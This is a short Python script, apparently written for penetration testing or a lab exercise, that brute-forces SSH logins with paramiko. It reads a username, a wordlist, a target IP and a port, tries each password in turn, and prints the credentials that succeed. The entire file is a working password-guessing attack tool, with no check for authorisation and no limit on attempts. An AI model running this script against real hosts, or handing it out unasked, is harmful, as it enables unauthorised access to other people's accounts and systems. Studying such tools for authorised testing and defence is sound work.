# Import necessary modules
from pwn import *
import paramiko
from paramiko.client import SSHClient

# Prompt the user for input
user = input("Please enter a username: ")
wordlist = input("Please provide the wordlist file name or path (e.g., password.txt or /home/user/wordlists/password.txt): ")
ip = input("Please enter an IP address: ")
port = int(input("Please enter a port number: "))

# SSH connection parameters
SSH_USER = user
SSH_HOST = ip
SSH_PORT = port

# Open and read the wordlist file
with open(wordlist) as pw:
    # Read each line from the wordlist file and remove any trailing whitespace
    lines = [line.rstrip() for line in pw]

# Iterate through each password in the wordlist
for x in lines:
    client = SSHClient()

    client.load_system_host_keys()
    try:
        # Attempt to establish an SSH connection
        client.connect(SSH_HOST, port=SSH_PORT,
                       username=SSH_USER,
                       password=x,
                       look_for_keys=False)
        # Print a success message and break the loop if the connection is successful
        print(f"Successfully connected with User: {SSH_USER} and Password: {x}")
        break
    except Exception:
        # Print a failure message if the connection fails
        print("Failed to establish a connection.")
